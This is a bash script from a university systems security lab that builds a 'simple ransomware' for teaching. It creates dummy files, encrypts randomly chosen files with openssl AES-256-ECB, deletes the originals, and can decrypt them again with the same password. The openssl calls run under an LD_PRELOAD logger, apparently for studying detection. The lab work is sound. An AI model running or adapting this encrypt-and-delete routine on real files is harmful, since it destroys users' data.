#!/bin/bash   
# the line above shows which shell to execute the bash script with

# Systems Security Class 2021, Technical University of Crete
# Lab no. 5
# "create a simple ransomware"

FILEDIR=$1
ENC_SUFFIX=".encrypt"

# create the directory, if it does not already exist
mkdir -p $FILEDIR

echo -n "Enter 0 to create, 1 to encrypt, and 2  to decrypt files: "
read choice
printf '\e[A\e[K'

if [[ $choice -eq 2 ]]
then
	start_time=$(date +%s)
	echo "[decryption mode]"
	echo -ne "enter the input filename(with ls wildcards): "
	read input
	echo -ne "enter password: "
	read -s pass
	echo ""
	N_OF_FILES=$(ls $FILEDIR/$input| wc -l)
	echo "-->Decrypting<--"
        echo -n "0%|----------------------------------------------------|100%"
        printf '\r'
        COUNT=1
	for FILE in $(ls $FILEDIR/$input)  
	do
		if [[ $FILE =~ .*$ENC_SUFFIX.* ]]; then
			export LD_PRELOAD=./logger.so ; openssl aes-256-ecb -pbkdf2 -iter 1000 -in $FILE -out $FILE.dec -d -k $pass 
			rm $FILE
		fi
		PERC=$(( COUNT*100 )) ; PERC=$(( PERC/N_OF_FILES ))
                echo -n "$PERC%|"
                for i in $(seq 1 2 $PERC)
                do
                        echo -n "█"
                done
                printf '\r'
                COUNT=$(( COUNT+1 ))
        done
        echo ""
        #printf '\e[A\e[K'



elif [[ $choice -eq 1 ]]
then 
	start_time=$(date +%s)
	echo "[encryption_mode]"
	echo -ne "Enter the input filename(with ls wildcards): "
	read input
	echo -ne "Enter password: "
	read -s pass
	echo ""
	N_OF_FILES=$(ls $FILEDIR/$input| wc -l)
	echo "-->Encrypting<--"
	echo -n "0%|----------------------------------------------------|100%"
	printf '\r'
	COUNT=1
	for FILE in $(ls $FILEDIR/$input)
        do
		RAND=$(shuf -i 0-1 -n 1)  # random 0 or 1 
		if [[ $RAND -eq 1 ]]  
		then
			export LD_PRELOAD=./logger.so ; openssl enc -aes-256-ecb -pbkdf2 -iter 1000 -in $FILE -out $FILE$ENC_SUFFIX -k $pass 
			rm $FILE
		fi
		PERC=$(( COUNT*100 )) ;	PERC=$(( PERC/N_OF_FILES ))
		echo -n "$PERC%|"
		for i in $(seq 1 2 $PERC)
		do
			echo -n "█"
		done
		printf '\r'  
		COUNT=$(( COUNT+1 ))
	done
	echo ""  
	#printf '\e[A\e[K'  

elif [[ $choice -eq 0  ]]
then
	start_time=$(date +%s)
	echo "[file_creation_mode]"
	echo -n "How many files to create: "
	read number_of_files
	echo -n "Basic Filename: "
	read filename
	COUNT=1
	echo "-->Creating Files<--"
	echo -n "0%|----------------------------------------------------|100%"
	printf '\r'
	for number in $(seq 1 $number_of_files)
	do
		# here we print a random string in the files specified
		tr -dc A-Za-z0-9 </dev/urandom | head -c 5000 > $FILEDIR/$filename$number

		# and then calculate the percentage that is created:
		PERC=$(( COUNT*100 ))  # we must first make COUNT bigger, bcoz shell cant handle floats!!
		PERC=$(( PERC/number_of_files ))

		# and use the percentage to print a loading bar:
		echo -n "$PERC%|"
		for i in $(seq 1 2 $PERC)  # step is 5 to reduce length of loading bar
		do
			echo -n "█"
		done
		printf '\r'  # return the cursor to the beginning of output line
		COUNT=$(( COUNT+1 ))
	done
	# flush the output:
	echo ""  #go to the next line
	#printf '\e[A\e[K'  # erase previous output line
else
	echo "Wrong Option."
fi

end_time=$(date +%s)  # the time in seconds since beginning of time
elapsed=$(( end_time - start_time ))
echo "Finished after $elapsed seconds."
